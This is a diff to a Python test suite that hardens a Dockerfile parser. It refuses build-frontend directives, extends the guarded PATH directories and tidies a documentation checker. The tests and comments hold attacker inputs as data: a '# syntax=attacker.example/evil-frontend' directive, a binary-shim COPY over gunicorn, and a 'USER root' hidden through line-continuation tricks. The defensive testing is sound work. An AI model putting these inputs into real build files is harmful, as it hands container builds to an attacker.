@@ -168,7 +168,7 @@ def _instructions(text: str | None = None) -> list[_Instruction]:
     # Parser directives are comments to every line-based reader and instructions to docker. An
     # `# escape=` directive stops `\` continuing a line, so docker split a HEALTHCHECK that this
     # parser had swallowed whole and read the `USER root` hidden inside it as its own
-    # instruction. Only the syntax directive is permitted; anything else is refused.
+    # instruction. EVERY directive is refused, `syntax` included; see the reasoning below.
     for raw in text.split("\n"):
         if not raw.strip().startswith("#"):
             break
@@ -342,12 +342,10 @@ def test_the_parser_follows_buildkit_continuation_semantics() -> None:
             f"a continuation padded with {tail!r} was mis-joined: {padded[-1].argument!r}"
         )
 
-    # And a backslash followed by anything ELSE is NOT a continuation, because docker trims only
-    # "\r\n" from a line end and tolerates only `[ \t]` after the backslash. Every carrier below
-    # is whitespace to `str.rstrip()` or a line break to `str.splitlines()`, and the parser used
-    # both: a LABEL ending `\` + VT swallowed the USER root on the next line while docker read
-    # two instructions and shipped root. The carriers are, in order: VT, FF, the C1 line
-    # separators, NEL, NBSP, EN QUAD, IDEOGRAPHIC SPACE, and LINE SEPARATOR.
+    # And a backslash followed by anything ELSE is NOT a continuation. The reasoning is at the
+    # line model in `_instructions`; the carriers are, in order: VT, FF, the C1 line separators,
+    # NEL, NBSP, EN QUAD, IDEOGRAPHIC SPACE, and LINE SEPARATOR, each of which is whitespace to
+    # `str.rstrip()` or a line break to `str.splitlines()`.
     for carrier in (
         "\x0b",
         "\x0c",
@@ -418,11 +416,8 @@ def test_the_claim_unit_splitter_pairs_a_colon_sentence_with_what_follows(
 def test_no_parser_directive_survives_the_first_line() -> None:
     """A directive is a comment to every line-based reader and an instruction to docker.
 
-    The version this replaces asserted the directive's NAME was `syntax` and never looked at its
-    VALUE, so `# syntax=attacker.example/evil-frontend:latest` passed the whole suite: a
-    frontend image of the attacker's choosing, handed this file and the build context, free to
-    emit any image at all. The shipped `docker/dockerfile:1` was itself a floating tag in a file
-    that pins its bases by digest.
+    The reasoning is at the refusal in `_instructions`; this asserts the outcome on the shipped
+    file and on six directive forms.
     """
     assert not _dockerfile().startswith("# syntax"), (
         "the Dockerfile opens with a syntax directive again; it names a build frontend image "
@@ -438,6 +433,20 @@ def test_no_parser_directive_survives_the_first_line() -> None:
     ):
         with pytest.raises(AssertionError, match="parser directive"):
             _instructions(f"{directive}\nFROM scratch\nUSER 10001:10001\n")
+
+    # The two shapes BuildKit's `DetectSyntax` honours BEYOND a leading `#name=` comment: a
+    # byte-order mark before the comment, and the C-style `// syntax=` form. Both select an
+    # attacker's frontend in the real parser. Both are refused here, but by the
+    # unrecognised-keyword assert rather than by the directive guard, so nothing pinned them and
+    # a change to the keyword handling could reopen them silently. Pinned now, by outcome rather
+    # than by which assert fires, because either refusal is fail-closed.
+    for exotic in (
+        "\ufeff# syntax=attacker.example/evil-frontend:latest",
+        "// syntax=attacker.example/evil-frontend:latest",
+        "#!/bin/sh\n# syntax=attacker.example/evil-frontend:latest",
+    ):
+        with pytest.raises(AssertionError):
+            _instructions(f"{exotic}\nFROM scratch\nUSER 10001:10001\n")
 
     # A comment that contains an equals sign somewhere OTHER than the directive position is
     # ordinary prose, and the shipped file's leading block is full of it. The refusal is
@@ -668,7 +677,51 @@ SUID_SWEEP = (
 )
 # Paths a mutation could plant a no-op binary on to neuter a command whose text is pinned.
 # `COPY --from=build /bin/true /usr/bin/find` was one line and left 22 of 22 tests green.
-_EXECUTABLE_DIRECTORIES = ("/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/", "/usr/local/bin/")
+#
+# `/opt/venv/bin/` was MISSING, and it is the FIRST entry on the shipped PATH: it holds the
+# gunicorn the pinned CMD execs and the python the HEALTHCHECK runs.
+# `COPY --from=build /bin/true /opt/venv/bin/gunicorn` in the prep stage passed 300 of 300, and
+# the image would then exec whatever that shim is, which makes every assertion about the launch
+# command a statement about a name that no longer resolves to gunicorn. The RUN spelling of the
+# same attack was caught only by accident, because "/opt/venv/bin/gunicorn" happens to contain
+# the substring "/bin/" that the RUN branch tests loosely and the COPY branch does not: two
+# branches of one guard disagreeing about the same file.
+#
+# So the list is now every directory on the shipped PATH plus the site-packages tree, and
+# `test_the_guarded_directories_cover_every_entry_on_the_shipped_path` asserts it against the
+# Dockerfile's own ENV rather than trusting this literal to stay current.
+_EXECUTABLE_DIRECTORIES = (
+    "/bin/",
+    "/sbin/",
+    "/usr/bin/",
+    "/usr/sbin/",
+    "/usr/local/bin/",
+    "/usr/local/sbin/",
+    "/opt/venv/bin/",
+    "/opt/venv/lib/python3.12/site-packages/",
+)
+
+
+def test_the_guarded_directories_cover_every_entry_on_the_shipped_path() -> None:
+    """Derived from the Dockerfile's own ENV PATH, so the guard list cannot drift from the image.
+
+    A directory on the PATH and absent from the guard is a place a shim can be planted over a
+    binary the pinned commands name. That is how `/opt/venv/bin/gunicorn` was open: the guard
+    listed the system directories and the venv was first on the PATH.
+    """
+    env = next(
+        instruction
+        for instruction in _final_stage()
+        if instruction.keyword == "ENV" and "PATH=" in instruction.argument
+    )
+    found = re.search(r'PATH="([^"]+)"', env.argument)
+    assert found is not None, f"the shipped ENV does not set PATH as a quoted value: {env.argument}"
+    guarded = {directory.rstrip("/") for directory in _EXECUTABLE_DIRECTORIES}
+    unguarded = [entry for entry in found.group(1).split(":") if entry.rstrip("/") not in guarded]
+    assert not unguarded, (
+        f"these directories are on the shipped PATH and not guarded, so a shim planted in one "
+        f"replaces a binary the pinned commands name: {unguarded}"
+    )
 
 
 def test_the_suid_sweep_is_exactly_the_command_that_clears_every_bit() -> None:
@@ -1068,8 +1121,9 @@ def _introduces_a_table(sentences: list[str]) -> str | None:
 
 
 # A colon sentence pairs with this many following units before it is dropped. Three covers a
-# heading and its table row, or a bullet list's first two items, and stops short of running the
-# sentence together with the next section.
+# heading and its table row, or a bullet list's first three items, and stops short of running the
+# sentence together with the next section. A wrong floor stated in the FOURTH unit after its
+# colon sentence passes, which is a residual recorded in the token-floor test's docstring.
 _PAIRING_REACH = 3
 
 
@@ -1078,6 +1132,14 @@ def _paired(pending: str | None, sentences: list[str]) -> list[str]:
     if not pending:
         return list(sentences)
     return list(sentences) + [f"{pending} {sentence}" for sentence in sentences]
+
+
+def _decayed(pending: str | None, reach: int) -> tuple[str | None, int]:
+    """The colon sentence one unit shorter, dropped once its reach runs out."""
+    if pending is None:
+        return None, 0
+    remaining = reach - 1
+    return (pending, remaining) if remaining > 0 else (None, 0)
 
 
 def _next_pending(sentences: list[str], pending: str | None, reach: int) -> tuple[str | None, int]:
@@ -1090,10 +1152,7 @@ def _next_pending(sentences: list[str], pending: str | None, reach: int) -> tupl
     introduces = _introduces_a_table(sentences)
     if introduces is not None:
         return introduces, _PAIRING_REACH
-    if pending is None:
-        return None, 0
-    remaining = reach - 1
-    return (pending, remaining) if remaining > 0 else (None, 0)
+    return _decayed(pending, reach)
 
 
 def _claim_units(path: Path) -> list[str]:
@@ -1143,9 +1202,9 @@ def _claim_units(path: Path) -> list[str]:
             # sentence must survive to reach the row that does.
             if pending and not re.fullmatch(r"\|[\s|:-]+\|", line):
                 units.append(f"{pending} {line}")
-                reach -= 1
-                if reach <= 0:
-                    pending = None
+                # The SAME decay as the prose branch, through the same helper. It was written
+                # out twice, so a change to the reach rule had to be made in two places.
+                pending, reach = _decayed(pending, reach)
             continue
         # Blank lines do NOT reset the pairing. Markdown puts one between a paragraph and the
         # table it introduces, so resetting there meant "the floor is the value in this table:"
@@ -1230,11 +1289,17 @@ def test_no_document_states_a_token_size_but_the_enforced_one() -> None:
     word in it and passes. What the inversion actually buys is that the NUMBER side needs no
     table, which is where five consecutive rounds of defeats came from.
 
-    THREE residuals remain, all recorded rather than implied away.
+    FOUR residuals remain, all recorded rather than implied away.
 
     First, the pronoun split: a floor stated across two sentences, where the one naming the token
     carries no number and the one carrying the number names no token, passes. Pairing adjacent
     sentences catches it and flags unrelated prose, so it is not done.
+
+    Second, the pairing REACH. A sentence ending in a colon pairs with the next three units, so a
+    wrong floor stated in the fourth bullet or row after it passes. Measured: "● 16, minimum." as
+    the first bullet under a colon sentence is caught and as the fourth is not. The bound is
+    deliberate, because an unbounded reach runs a colon sentence together with the next section
+    and starts flagging true statements, and it is asserted in the splitter's own test.
 
     And two tables, both of which have been one entry short. The size-word set: "16 random units"
     states a floor with no size word in it. And the token-synonym set: "the shared access key as
